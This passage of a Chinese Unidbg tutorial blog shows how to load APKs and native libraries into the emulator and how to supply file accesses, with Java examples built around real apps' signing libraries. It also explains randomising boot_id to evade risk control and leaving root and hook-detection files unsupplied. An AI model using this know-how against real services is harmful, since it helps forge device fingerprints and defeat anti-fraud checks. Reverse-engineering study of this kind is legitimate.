apk，就可以在 Unidbg 中访问 apk assets 目录下的文件。</p><pre><code class="language-Java">@Overridepublic byte[] openAsset(String fileName) &#123;    try (net.dongliu.apk.parser.ApkFile apkFile = new net.dongliu.apk.parser.ApkFile(this.apkFile)) &#123;        return apkFile.getFileData(&quot;assets/&quot; + fileName);    &#125; catch (IOException e) &#123;        throw new IllegalStateException(e);    &#125;&#125;</code></pre><p>样本通过 AAssetManager_open 等 API  访问 apk 的资源时，就依赖于这些 API 以及载入的 apk 文件。综上所述，建议创建虚拟机时选择加载 apk。</p><p>值得一提的，Unidbg 使用 <a href="https://github.com/hsiafan/apk-parser">apk-parser</a> 完成相关解析工作，读者也可以在自己的项目里使用它来解析 apk。</p><pre><code class="language-Java">&lt;dependency&gt;    &lt;groupId&gt;net.dongliu&lt;/groupId&gt;    &lt;artifactId&gt;apk-parser&lt;/artifactId&gt;    &lt;version&gt;2.6.10&lt;/version&gt;&lt;/dependency&gt;</code></pre><h4 id="3-2加载模块"><a href="#3-2加载模块" class="headerlink" title="3.2加载模块"></a>3.2加载模块</h4><p>如何加载 so 到 Unidbg 里？需要通过 loadLibrary API，它的函数原型如下：</p><pre><code class="language-Java">//参数一: 动态库或可执行ELF文件//参数二: 是否强制执行 init_proc、init_array 初始化系列函数DalvikModule loadLibrary(File elfFile, boolean forceCallInit);//参数一：动态库或可执行ELF文件名，比如 libkwsgmain.so 其名就是 kwsgmain，//Unibdg 会在 apk lib 目录下找到和加载它//参数二: 是否强制执行 init_proc、init_array 初始化系列函数DalvikModule loadLibrary(String libname, boolean forceCallInit);</code></pre><p>建议使用第二个重载，这个 API 在使用上近似于 Java 的 System.loadLibrary(soName)，比如libkwsgmain.so 对应为 kwsgmain ，掐头去尾。</p><pre><code class="language-Java">vm.loadLibrary(&quot;kwsgmain&quot;, true);</code></pre><p>对应的加载代码如下</p><pre><code class="language-Java">@Overridepublic final DalvikModule loadLibrary(String libname, boolean forceCallInit) &#123;    String soName = &quot;lib&quot; + libname + &quot;.so&quot;;    LibraryFile libraryFile = findLibrary(soName);    if (libraryFile == null) &#123;        throw new IllegalStateException(&quot;load library failed: &quot; + libname);    &#125;    Module module = emulator.getMemory().load(libraryFile, forceCallInit);    return new DalvikModule(this, module);&#125;</code></pre><p>它需要加载 APK 才可以使用，然后在 apk 的 lib 目录下找你想要加载的 SO。</p><p>32 位代码如下</p><pre><code class="language-Java">byte[] loadLibraryData(Apk apk, String soName) &#123;    byte[] soData = apk.getFileData(&quot;lib/armeabi-v7a/&quot; + soName);    if (soData != null) &#123;        if (log.isDebugEnabled()) &#123;            log.debug(&quot;resolve armeabi-v7a library: &quot; + soName);        &#125;        return soData;    &#125;    soData = apk.getFileData(&quot;lib/armeabi/&quot; + soName);    if (soData != null &amp;&amp; log.isDebugEnabled()) &#123;        log.debug(&quot;resolve armeabi library: &quot; + soName);    &#125;    return soData;&#125;</code></pre><p>64 位代码如下</p><pre><code class="language-Java">byte[] loadLibraryData(Apk apk, String soName) &#123;    byte[] soData = apk.getFileData(&quot;lib/arm64-v8a/&quot; + soName);    if (soData != null) &#123;        if (log.isDebugEnabled()) &#123;            log.debug(&quot;resolve arm64-v8a library: &quot; + soName);        &#125;        return soData;    &#125; else &#123;        return null;    &#125;&#125;</code></pre><p>如果使用第一个重载，自己传入 SO 文件，不必加载 apk。</p><pre><code class="language-Java">vm.loadLibrary(new File(&quot;unidbg-android/src/test/resources/example_binaries/armeabi-v7a/libsignutil.so&quot;), true);</code></pre><p>除了这两个，Unidbg 还有一个用于加载 SO 字节数组的重载方法。</p><pre><code class="language-Java">loadLibrary(String libname, byte[] raw, boolean forceCallInit)</code></pre><p>它的主要应用场景是使用 Unidbg 加载 dump memory，但事实上，这个 API 缺少维护，实际并不可用。</p><h4 id="3-3-加载依赖模块"><a href="#3-3-加载依赖模块" class="headerlink" title="3.3 加载依赖模块"></a>3.3 加载依赖模块</h4><p>​       这里我们要聊聊加载依赖 SO 的问题，目标 SO 总会依赖一些外部 SO，具体分为系统库和自身库。系统库比如 libc.so，liblog.so，它们提供了实现各种代码逻辑必不可少的基础函数。自身库则指的是目标函数可能依赖于自身另外一个库的导出函数或符号。</p><p>​       在 IDA 的头部可以看到这些依赖库信息，或使用诸如 objdump、readelf 任意工具也可以获取这一信息。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1664461303595-3029a567-ace5-4724-8d75-11903f071888.png" alt="image.png"></p><p>​       在真实 Android 系统的加载逻辑中，会解析依赖库，判断这些依赖库是否已加载到内存，如果没有加载到内存，就到诸如 &#x2F;vendor&#x2F;lib 这样的系统库路径以及 &#x2F;data&#x2F;app&#x2F;packageName&#x2F;base.apk!&#x2F;lib&#x2F;armeabi-v7a 这样的用户库路径下找所依赖的 SO 其文件。</p><p>​        在 Unidbg 的逻辑里，处理也类似，但代码逻辑要简单非常多。我们只需要通过 setLibraryResolver 确认使用哪一种文件，参数可选 23 和 19。 </p><p>​        分别对应于 sdk23（Android 6） 和 sdk19（Android 4.4）。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250719162055695.png"></p><p>​       如果你设置为 64 位模拟器，那么 sdk19 无法满足你，因为 Android 4.4 的彼时没有对应 64 位的系统库。</p><p>​       我们一般使用 sdk23，读者可能认为 Android 6.0 的运行库环境太低了，但事实上，对于 Native Runtime 而言，似乎已然够用，如果读者希望使用更高的版本，并非将真机的 SO 放到 Unidbg 就大功告成，Unidbg 为这两个 SDK 环境做了一些优化和 patch 处理，你也需要做对应的处理才能让新环境正常可用。</p><p>​        寻找依赖 SO 的逻辑如下</p><pre><code class="language-Java">LibraryFile neededLibraryFile = libraryFile.resolveLibrary(emulator, neededLibrary);if (libraryResolver != null &amp;&amp; neededLibraryFile == null) &#123;    neededLibraryFile = libraryResolver.resolveLibrary(emulator, neededLibrary);&#125;</code></pre><p>​          第二处 resolveLibrary 是寻找我们所设置的系统库路径下是否有对应的 SO。</p><pre><code class="language-Java">protected static LibraryFile resolveLibrary(Emulator&lt;?&gt; emulator, String libraryName, int sdk, Class&lt;?&gt; resClass) &#123;    final String lib = emulator.is32Bit() ? &quot;lib&quot; : &quot;lib64&quot;;    String name = &quot;/android/sdk&quot; + sdk + &quot;/&quot; + lib + &quot;/&quot; + libraryName.replace(&#39;+&#39;, &#39;p&#39;);    URL url = resClass.getResource(name);    if (url != null) &#123;        return new URLibraryFile(url, libraryName, sdk, emulator.is64Bit());    &#125;    return null;&#125;</code></pre><p>​        第一处是寻找用户库下是否有依赖 SO，如果加载目标 SO 时采用文件方式，那么它会在文件所处的文件夹下寻找。</p><pre><code class="language-Java">@Overridepublic LibraryFile resolveLibrary(Emulator&lt;?&gt; emulator, String soName) &#123;    File file = new File(elfFile.getParentFile(), soName);    return file.canRead() ? new ElfLibraryFile(file, is64Bit) : null;&#125;</code></pre><p>如果加载目标 SO 时采用 apk 内部 lib 下寻找的方式，那么寻找依赖库时也会同理。</p><pre><code class="language-Java">@Overridepublic LibraryFile resolveLibrary(Emulator&lt;?&gt; emulator, String soName) &#123;    byte[] libData = baseVM.loadLibraryData(apk, soName);    return libData == null ? null : new ApkLibraryFile(baseVM, this.apk, soName, libData, packageName, is64Bit);&#125;// 32 位byte[] loadLibraryData(Apk apk, String soName) &#123;    byte[] soData = apk.getFileData(&quot;lib/armeabi-v7a/&quot; + soName);    if (soData != null) &#123;        if (log.isDebugEnabled()) &#123;            log.debug(&quot;resolve armeabi-v7a library: &quot; + soName);        &#125;        return soData;    &#125;    soData = apk.getFileData(&quot;lib/armeabi/&quot; + soName);    if (soData != null &amp;&amp; log.isDebugEnabled()) &#123;        log.debug(&quot;resolve armeabi library: &quot; + soName);    &#125;    return soData;&#125;</code></pre><p>​       简而言之，简直加载 apk，简直 loadlibrary 传入 SO 名而非 SO 文件，不管是内部逻辑还是实际场景上，都更稳妥好用。</p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unidbg 中处理文件访问(一)</title>
      <link href="/2025/07/15/Unidbg%20%E4%B8%AD%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2025/07/15/Unidbg%20%E4%B8%AD%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Unidbg-中处理文件访问（一）"><a href="#Unidbg-中处理文件访问（一）" class="headerlink" title="Unidbg 中处理文件访问（一）"></a>Unidbg 中处理文件访问（一）</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>补文件访问在 Unidbg 补环境这项工作里的重要性仅次于补 JNI 环境，它有两个主要特征：</p><p><strong>一是出现频率高</strong>：<br>它的出现频率远高于补系统调用、补库函数、补虚拟模块这些情况，仅次于 JNI 调用。信息获取和环境检测都会大量使用文件访问。</p><p><strong>二是容易被补漏</strong>：<br>Unidbg 对文件访问提供了很好的监控和打印，所谓容易补漏，主要是使用者的问题。因为安卓碎片化严重、版本多、权限管理混乱等等原因，因为即使在真实 Android 环境里，访问某个文件没成功也是很常见的事，因此开发上会做大量的兼容处理。换句话说，大部分文件补了最好，不补也不一定有事。因此许多 Unidbg 的使用者走向了极端——完全不关注文件访问，这确实省时省力，而且 80% 样本来说没有影响。但是，在 20% 的样本和场景里会出问题，而且往往越难的样本越会出问题。</p><p>因此学号怎么补文件访问还是挺重要的，本篇就是系统地讲这个问题。</p><h3 id="二、概述"><a href="#二、概述" class="headerlink" title="二、概述"></a>二、概述</h3><p>文件访问最主要服务于环境检测和信息收集，举例如下。</p><ul><li>访问 &#x2F;proc&#x2F;self&#x2F;maps 检测 frida&#x2F;xposed 等模块。</li><li>访问 &#x2F;proc&#x2F;net&#x2F;tcp 检测 frida&#x2F;ida server 默认端口。</li><li>访问 &#x2F;proc&#x2F;self&#x2F;cmdline 确认在自身进程内。</li><li>访问 apkfile 做签名校验，解析资源文件等。</li><li>访问 &#x2F;xbin&#x2F;su 检测 root。</li><li>访问 data&#x2F;data&#x2F;package&#x2F;xxx 读取自身有关文件</li></ul><p>Unidbg 通过文件处理器处理文件。默认的文件处理器是 AndroidResolver，我们可以在它的 resolve 方法里处理样本发起的文件访问。</p><pre><code class="language-Java">//source:src/main/java/com/github/unidbg/linux/android/AndroidResolver.java    @Overridepublic FileResult&lt;AndroidFileIO&gt; resolve(Emulator&lt;AndroidFileIO&gt; emulator, String path, int oflags) &#123;    // 相关逻辑，此处省略    return null;&#125;</code></pre><p>在这里写代码可不是一个好方案，出于两方面原因：</p><ul><li>可移植性差：AndroidResolver 属于 Unidbg 源码的一部分，修改 AndroidResolver 使其失去了灵活性。如果想迁移项目，需要对整个Unidbg 环境打包。</li><li>环境混乱：我们一般会在 Unidbg 环境里处理多个样本，它们都有文件访问的需求，对于同一个文件，不同样本的预期返回不一定相同，比如 &#x2F;proc&#x2F;self&#x2F;cmdline 查看包名，在 AndroidResolver 中难以做区分。</li></ul><p>Unidbg 并不会让我们陷入泥潭，在文件处理上它采用了责任链模式的设计。用户可以自定义一个或多个文件处理器，当文件访问发生时，多个文件处理器都有机会处理该文件访问，直到其中某个对它处理成功，或最终失败返回为止。责任链模式将多个文件处理器串成链，然后让文件访问在链上传递。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1663979960314-954f455b-b2bc-4d52-8b40-1111cc987bef.png" alt="img"></p><p>先依次进入用户自定义的 IOResolver A 和 B ，然后就是 AndroidResolver，最后是虚拟文件系统。如果文件访问在较早的某处得到了处理，那就会直接返回。图例所对应的代码如下。</p><pre><code class="language-Java">protected final FileResult&lt;T&gt; resolve(Emulator&lt;T&gt; emulator, String pathname, int oflags) &#123;    FileResult&lt;T&gt; failResult = null;    // 依次进入每个文件解析器，以期得到处理    for (IOResolver&lt;T&gt; resolver : resolvers) &#123;        FileResult&lt;T&gt; result = resolver.resolve(emulator, pathname, oflags);        if (result != null &amp;&amp; result.isSuccess()) &#123;            emulator.getMemory().setErrno(0);            return result;        &#125; else if (result != null) &#123;            if (failResult == null || !failResult.isFallback()) &#123;                failResult = result;            &#125;        &#125;    &#125;    if (failResult != null &amp;&amp; !failResult.isFallback()) &#123;        return failResult;    &#125;// 虚拟文件系统    FileResult&lt;T&gt; result = emulator.getFileSystem().open(pathname, oflags);    if (result != null &amp;&amp; result.isSuccess()) &#123;        emulator.getMemory().setErrno(0);        return result;    &#125;   // 一些杂项路径判断和处理，此处省略        return failResult;&#125;</code></pre><p>Unidbg 在这里的设计也并非完美，一些特殊以及杂项文件的处理没有设计对应的文件处理器，而是较为零散的放在各处。事实上，将它们重构为一个 procFileIOResolver 会更合理，感兴趣的读者可以去做尝试。</p><pre><code class="language-Java">if ((&quot;/proc/&quot; + emulator.getPid() + &quot;/fd&quot;).equals(pathname) || &quot;/proc/self/fd&quot;.equals(pathname)) &#123;    return createFdDir(oflags, pathname);&#125;if ((&quot;/proc/&quot; + emulator.getPid() + &quot;/task/&quot;).equals(pathname) || &quot;/proc/self/task/&quot;.equals(pathname)) &#123;    return createTaskDir(emulator, oflags, pathname);&#125;</code></pre><p>上面我们从一个比较高的视角观察了 Unidbg 中文件访问的处理流程，接下里进入细节，可不能眼高手低。首先是定义和添加文件处理器的具体写法，<strong>addIOResolver</strong> 用于添加一个文件处理器对象，将如下代码放在早于 <strong>loadLibrary</strong> 的时机即可生效。</p><pre><code class="language-Java">emulator.getSyscallHandler().addIOResolver(new IOResolver&lt;AndroidFileIO&gt;() &#123;    @Override    public FileResult&lt;AndroidFileIO&gt; resolve(Emulator&lt;AndroidFileIO&gt; emulator, String pathname, int oflags) &#123;        System.out.println(&quot;file open:&quot;+pathname);        return null;    &#125;&#125;);</code></pre><p>有时候我们会让目标类实现 IOResolver 接口，那么就是 addIOResolver(this)。</p><pre><code class="language-Java">package com.test3;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Emulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.file.FileResult;import com.github.unidbg.file.IOResolver;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class TEST3 extends AbstractJni implements IOResolver&lt;AndroidFileIO&gt; &#123;    private final AndroidEmulator emulator;    private final DvmClass LibBili;    private final VM vm;    public TEST3() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;tv.danmaku.bili&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test3\\bilibili.apk&quot;));        vm.setJni(this);        vm.setVerbose(true);        // add        emulator.getBackend().registerEmuCountHook(10000); // 设置执行多少条指令切换一次线程        emulator.getSyscallHandler().setVerbose(true);        emulator.getSyscallHandler().setEnableThreadDispatcher(true);        emulator.getSyscallHandler().addIOResolver(this);        //加载Dalvik的模块        DalvikModule dm = vm.loadLibrary(&quot;bili&quot;, true);        //加载目标类        LibBili = vm.resolveClass(&quot;com.bilibili.nativelibrary.LibBili&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public static void main(String[] args) &#123;        TEST3 test3 = new TEST3();    &#125;    @Override    public FileResult resolve(Emulator emulator, String pathname, int oflags) &#123;        System.out.println(&quot;lilac open: &quot; + pathname);        return null;    &#125;&#125;</code></pre><p>在处理很复杂的样本时，我们希望逻辑分离，那么可以把 IOSresolver 从主类中摘出去。</p><pre><code class="language-Java">package com.test3;import com.github.unidbg.Emulator;import com.github.unidbg.file.FileResult;import com.github.unidbg.file.IOResolver;import com.github.unidbg.file.linux.AndroidFileIO;public class BiliIOResolver implements IOResolver&lt;AndroidFileIO&gt; &#123;    @Override    public FileResult&lt;AndroidFileIO&gt; resolve(Emulator&lt;AndroidFileIO&gt; emulator, String pathname, int oflags) &#123;        System.out.println(&quot;file open:&quot;+pathname);                return null;    &#125;&#125;</code></pre><p>主类代码</p><pre><code class="language-Java">package com.test3;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Emulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.file.FileResult;import com.github.unidbg.file.IOResolver;import com.github.unidbg.file.linux.AndroidFileIO;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.AbstractJni;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.DvmClass;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import java.io.File;public class TEST3 extends AbstractJni&#123;    private final AndroidEmulator emulator;    private final DvmClass LibBili;    private final VM vm;    public Bili() &#123;        emulator = AndroidEmulatorBuilder.for32Bit()                .addBackendFactory(new Unicorn2Factory(false))                .build();        emulator.getBackend().registerEmuCountHook(10000); // 设置执行多少条指令切换一次线程        emulator.getSyscallHandler().setVerbose(true);        emulator.getSyscallHandler().setEnableThreadDispatcher(true);        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;unidbg-android/src/test/resources/bili/bili.apk&quot;));        vm.setVerbose(true);        vm.setJni(this);        emulator.getSyscallHandler().addIOResolver(new BiliIOResolver());        DalvikModule dm = vm.loadLibrary(&quot;bili&quot;, true);        LibBili = vm.resolveClass(&quot;com.bilibili.nativelibrary.LibBili&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public void calla()&#123;        String appkey = LibBili.callStaticJniMethodObject(emulator, &quot;a(Ljava/lang/String;)Ljava/lang/String;&quot;, &quot;android&quot;).getValue().toString();        System.out.println(&quot;result:&quot;+appkey);    &#125;    public static void main(String[] args) &#123;        TEST3 test3 = new TEST3();        test3.calla();    &#125;&#125;</code></pre><p>添加多个自定义文件处理器的场景里(比如处理某公司旗下的多个样本，它们在多数文件访问上类似，但少部分需要各自处理)，需要注意后添加的优先级更高。</p><pre><code class="language-Java">/** * 后面添加的优先级高 */void addIOResolver(IOResolver&lt;T&gt; resolver);</code></pre><p>比如下面的逻辑里，文件访问会首先经过B，其次才是A</p><pre><code class="language-Java">emulator.getSyscallHandler().addIOResolver(new IOResolver&lt;AndroidFileIO&gt;() &#123;    @Override    public FileResult&lt;AndroidFileIO&gt; resolve(Emulator&lt;AndroidFileIO&gt; emulator, String pathname, int oflags) &#123;        System.out.println(&quot;Resolver A&quot;);        return null;    &#125;&#125;);emulator.getSyscallHandler().addIOResolver(new IOResolver&lt;AndroidFileIO&gt;() &#123;    @Override    public FileResult&lt;AndroidFileIO&gt; resolve(Emulator&lt;AndroidFileIO&gt; emulator, String pathname, int oflags) &#123;        System.out.println(&quot;Resolver B&quot;);        return null;    &#125;&#125;);</code></pre><p>自定义以及添加文件处理器需要关注的内容就这么多，接下来是具体的文件处理。</p><h3 id="三、文件访问基本处理"><a href="#三、文件访问基本处理" class="headerlink" title="三、文件访问基本处理"></a>三、文件访问基本处理</h3><p>这是本篇的主要内容，也是补环境的实际指导。如果想学好它，需要意识到它的知识由三部分构成。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1663983989813-a3022bde-395c-4da8-b671-e1e60033846e.png" alt="image.png"></p><p>举个例子，我们设置了自定义文件处理器，打印样本所访问的文件，假如日志里出现了下面这么一行</p><pre><code class="language-shell">file open:/proc/sys/kernel/random/boot_id</code></pre><p>Linux&#x2F;Android 文件系统的知识：boot_id 文件在开机时生成，在设备关机前不会改变内容。我们将这个文件从真机上 push 出来</p><p>对业务的经验：boot_id 常用于构建设备指纹或单纯的信息采集，需要补它。</p><p>Unidbg 对应的实现和映射：像下面这样补它</p><pre><code class="language-Java">emulator.getSyscallHandler().addIOResolver(new IOResolver&lt;AndroidFileIO&gt;() &#123;    @Override    public FileResult&lt;AndroidFileIO&gt; resolve(Emulator&lt;AndroidFileIO&gt; emulator, String pathname, int oflags) &#123;        //参数二: 文件路径        //参数三: 操作文件标志        switch (pathname)&#123;            case &quot;/proc/sys/kernel/random/boot_id&quot;:&#123;                return FileResult.&lt;AndroidFileIO&gt;success(new SimpleFileIO(oflags, new File(&quot;unidbg-android/src/test/resources/dewu/cpu/boot_id&quot;), pathname));            &#125;        &#125;        return null;    &#125;&#125;);</code></pre><p>我们主要讲解第一部分，也会适时补充第二、三部分的内容。先看代码，我们用switch case 对 pathname 做判断，也对 boot_id 做处理，return 语句看起来有些复杂，我们拆解一下。</p><p>最外层是 <strong>FileResult.<AndroidFileIO>success</strong>，我们可以返回任意 AndroidFileIO 类型的文件，这么说有点怪，这是因为 Unidbg 是一个 Android&#x2F;IOS 双端的 Native 模拟器，除了 AndroidFileIO 还有对应于 IOS 的DarwinFileIO，所以由此限制。</p><p>对文件访问有 success、failed、fallback 三种处理</p><ul><li>success 表示文件顺利访问，参数是 NewFileIO。</li><li>failed 表示文件访问失败，参数是 error 错误码。</li><li>fallback 表示回退、降级，只有在其他处理器无法处理对该文件的访问时，才由 fallback 指定的文件 IO 来处理。</li></ul><p>第一种使用最多，只有文件访问的意图正常——信息收集，我们都很乐意正常予以返回。因为我们希望程序收集到足够多且内容合理的设备信息，以顺利执行完函数以及规避简单风控。</p><p>SimpleFileIO 时最常用的 IO 类型，它代表普通文件，上面补 boot_id 就用的它。resolve 所提供的 oflags 和 path 原封不动的传给它，file是从真机 pull 出来的 boot_id 文件。</p><pre><code class="language-Java">public SimpleFileIO(int oflags, File file, String path) &#123;    super(oflags);    this.file = file;    this.path = path;    if (file.isDirectory()) &#123;        throw new IllegalArgumentException(&quot;file is directory: &quot; + file);    &#125;    if (!file.exists()) &#123;        throw new IllegalArgumentException(&quot;file not exists: &quot; + file);    &#125;&#125;</code></pre><p>读者可能会像一个问题，boot_id 在一定程度上用于标识设备，那么在生产环境中，我们需要对它做随机化以躲避风控。使用 SimpleFileIO 就不太好处理这个问题，这时候就可以用 ByteArrayFileIO。</p><pre><code class="language-Java">emulator.getSyscallHandler().addIOResolver(new IOResolver&lt;AndroidFileIO&gt;() &#123;    @Override    public FileResult&lt;AndroidFileIO&gt; resolve(Emulator&lt;AndroidFileIO&gt; emulator, String pathname, int oflags) &#123;        System.out.println(&quot;Resolver A&quot;);        switch (pathname)&#123;            case &quot;/proc/sys/kernel/random/boot_id&quot;:&#123;                return FileResult.&lt;AndroidFileIO&gt;success(new ByteArrayFileIO(oflags,  pathname, UUID.randomUUID().toString().getBytes(StandardCharsets.UTF_8)));            &#125;        &#125;        return null;    &#125;&#125;);</code></pre><p>ByteArrayFileIO 在 oflags、pathname 上和 SimpleFileIO 无差别，但它接收一个字节数组而非 File 文件，对于灵活补文件内容有很大的帮助。读者也需要知道它的副作用——没办法对文件做写入操作，ByteArrayFileIO 像浮萍漂泊，无根无依。</p><pre><code class="language-Java">@Overridepublic int write(byte[] data) &#123;    throw new UnsupportedOperationException();&#125;</code></pre><p>如果样本访问的是一个目录呢？这时候就要用 DirectoryFileIO，File 传入文件夹即可。</p><pre><code class="language-Java">case &quot;/data/data/com.sankuai.meituan&quot;:&#123;    return FileResult.&lt;AndroidFileIO&gt;success(new DirectoryFileIO(oflags, pathname, new File(&quot;unidbg-android/src/test/resources/meituan/data&quot;)));&#125;</code></pre><p>但对于文件夹访问而言，使用虚拟文件系统是更好的选择。</p><p>使用虚拟文件系统，我们对文件的掌控程度会下降，在补常规文件时不算好办法，但补文件夹算是一个特殊情况。举个例子，如果样本访问本机的 &#x2F;sysytem&#x2F;fonts 目录，对所有字体文件做 md5 然后上传。如果用 DirectoryFileIO 补，那么在补了 fonts 文件夹后，还需要用 SimpleFileIO 处理每个字体文件的访问，工作量很大，而使用虚拟文件系统，只要把文件夹对对应位置放好，就可以顺利处理整个逻辑。</p><p>需要注意，补文件访问时不要犯低级错误，比如样本访问 proc&#x2F;version，尽管和 &#x2F;proc&#x2F;version 是一回事，但你可不要多了一个斜杠，pathname 字符串匹配找不到了。</p><p>80%的情况里，你就会遇到这么点文件访问的需求——从真机中把对应的文件拖出来，用SimpleFileIO、ByteArrayFileIO、DirectoryFileIO 以及虚拟文件系统去处理它。</p><p>比如补 apk，在任何情况下，都不应该对访问 apk 忽略不管，因为它往往用于资源读取或签名校验，不补风险很大。</p><pre><code class="language-Java">case &quot;/data/app/com.jingdong.app.mall-jJGgNO9r6uKMLj1ytVwSRw==/base.apk&quot;:&#123;    return FileResult.&lt;AndroidFileIO&gt;success(new SimpleFileIO(oflags, new File(&quot;unidbg-android/src/test/resources/jd/jd.apk&quot;), pathname));&#125;</code></pre><p>补 CPU 信息</p><pre><code class="language-Java">// https://bbs.pediy.com/thread-229579-1.htmcase &quot;/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq&quot;:&#123;    return FileResult.&lt;AndroidFileIO&gt;success(new ByteArrayFileIO(oflags, pathname, &quot;1766400&quot;.getBytes()));&#125;</code></pre><p>补电池信息</p><pre><code class="language-Java">case &quot;/sys/class/power_supply/battery/temp&quot;:&#123;    return FileResult.&lt;AndroidFileIO&gt;success(new SimpleFileIO(oflags, new File(&quot;unidbg-android/src/test/resources/meituan/files/battery/temp&quot;), pathname));&#125;case &quot;/sys/class/power_supply/battery/voltage_now&quot;:&#123;    return FileResult.&lt;AndroidFileIO&gt;success(new SimpleFileIO(oflags, new File(&quot;unidbg-android/src/test/resources/meituan/files/battery/voltage_now&quot;), pathname));&#125;</code></pre><p>接下来说说 failed，它表示文件访问失败，使用场景其实也不多。因为只要我们什么都不补，AndroidResolver 里没有处理这个文件，虚拟文件系统中也不包含它，那就自动访问失败 + 设置错误码。</p><p>但有个情况比较例外——如果文件访问 &#x2F;data，判断是都有写权限，进而确认设备环境是否 Root 的话，我们需要手动处理。</p><pre><code class="language-Java">case &quot;/data&quot;:&#123;    return FileResult.failed(UnixEmulator.EACCES);&#125;</code></pre><p>因为虚拟文件系统会自动生成 data 目录，进而访问成功。错误码列表如下，也可以直接使用看 Linux 的错误码文档进行设置，Unidbg 本就是它的简单映射。</p><pre><code class="language-Java">package com.github.unidbg.unix;public interface UnixEmulator &#123;    int EPERM = 1; /* Operation not permitted */    int ENOENT = 2; /* No such file or directory */    int ESRCH = 3; /* No such process */    int EINTR = 4; /* Interrupted system call */    int EBADF = 9; /* Bad file descriptor */    int EAGAIN = 11; /* Resource temporarily unavailable */    int ENOMEM = 12; /* Cannot allocate memory */    int EACCES = 13; /* Permission denied */    int EFAULT = 14; /* Bad address */    int EEXIST = 17; /* File exists */    int ENOTDIR = 20; /* Not a directory */    int EINVAL = 22; /* Invalid argument */    int ENOTTY = 25; /* Inappropriate ioctl for device */    int ENOSYS = 38; /* Function not implemented */    int ENOATTR = 93; /* Attribute not found */    int EOPNOTSUPP = 95; /* Operation not supported on transport endpoint */    int EAFNOSUPPORT = 97; /* Address family not supported by protocol family */    int EADDRINUSE = 98; /* Address already in use */    int ECONNREFUSED = 111; /* Connection refused */&#125;</code></pre><h3 id="四、环境检测"><a href="#四、环境检测" class="headerlink" title="四、环境检测"></a>四、环境检测</h3><p>当样本做环境检测相关的文件访问时，主要检测这些文件是否存在，以及是否有权限</p><ul><li>Root检测（检测su、magisk、riru、检测市面上的 Root 工具）</li><li>模拟器检测（检测Qemu、检测各家模拟器，比如夜神、雷电、MuMu 等模拟器的文件特征、驱动特征等）</li><li>危险应用检测（各类多开助手、按键精灵、接码平台）</li><li>云手机检测（以各种云手机产品为主）</li><li>Hook框架（以Xposed、Substrate、Frida 为主）</li><li>脱壳机（以 Fart、DexHunter、Youpk三者为主）</li></ul><p>我们选择什么都不补就行，因为不管时自定义还是默认的文件处理器，以及虚拟文件系统里，都不会有这样的内容，这正和我们的意。就像下面这样，什么都不补就行了。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1663992483880-6b2a029e-b619-48e1-9f8c-0b9a690b299d.png" alt="img"></p><p>读者需要自行分辨某个文件访问是否属于此类，如果琢磨不定建议 Google 搜索这个文件的主要用途。</p><h3 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h3><p>本篇介绍了 Unidbg 中文件处理的基本逻辑和基本使用，80%的场景中它们已经够用。但如果你想探索剩下的20%，以及更多的原理层的内容，就需要看接下来的数篇。</p><h3 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h3><p>[Unidbg 中处理文件访问（一）](<a href="https://www.yuque.com/lilac-2hqvv/lfssh8/euffrv#">https://www.yuque.com/lilac-2hqvv/lfssh8/euffrv?#</a> 《Unidbg 中处理文件访问（一）》)</p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从实践中学习unidbg使用(四)</title>
      <link href="/2025/07/08/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E5%9B%9B)/"/>
